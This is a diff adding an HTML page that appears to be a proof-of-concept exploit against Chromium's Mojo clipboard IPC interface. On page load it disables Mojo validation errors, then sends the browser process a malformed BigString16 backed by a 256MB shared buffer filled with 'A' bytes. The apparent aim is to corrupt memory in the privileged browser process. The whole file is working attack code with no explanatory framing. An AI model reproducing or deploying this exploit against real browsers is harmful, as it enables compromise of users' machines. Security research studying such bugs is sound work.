@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<body onload="func1()">
+   <script src="./mojo_bindings.js"></script>
+   <script src="./third_party/blink/public/mojom/clipboard/clipboard.mojom.js"></script>
+<script>
+    for(var e in mojo.internal.validationError)mojo.internal.validationError[e]='';
+
+    function CreateBigString(pipe, length){
+        return Object.assign(new mojoBase.mojom.BigString16, {
+            data : Object.assign(new mojoBase.mojom.BigBuffer, {
+                sharedMemory : Object.assign(new mojoBase.mojom.BigBuffer, {
+                    bufferHandle : pipe.handle,
+                    size : length
+                })
+            })
+        });
+    }
+
+    var ch_ptr = new blink.mojom.ClipboardHostPtr();
+    Mojo.bindInterface(blink.mojom.ClipboardHost.name,mojo.makeRequest(ch_ptr).handle);
+
+    function func1(){
+        ch_ptr.readText(0).then(result=>{
+            if(!result.result.data.$data.size | result.result.data.$data.size<0x10000000){
+                var length = 0x10000000;
+                var pipe = Mojo.createSharedBuffer(length);
+                var xxx = pipe.handle.mapBuffer(0,length);
+                var data = new Uint8Array(xxx.buffer);
+                for (var i = 0;i < length;i+=2){
+                    data[i] = 0x41;
+                    data[i+1] = 0;
+                }
+                ch_ptr.writeText(CreateBigString(pipe,length));
+                ch_ptr.commitWrite();
+                window.close();
+            }else{
+                setTimeout(()=>{window.close();},2000);
+            }
+        });
+    };
+    
+</script>
+</body>
+</html>
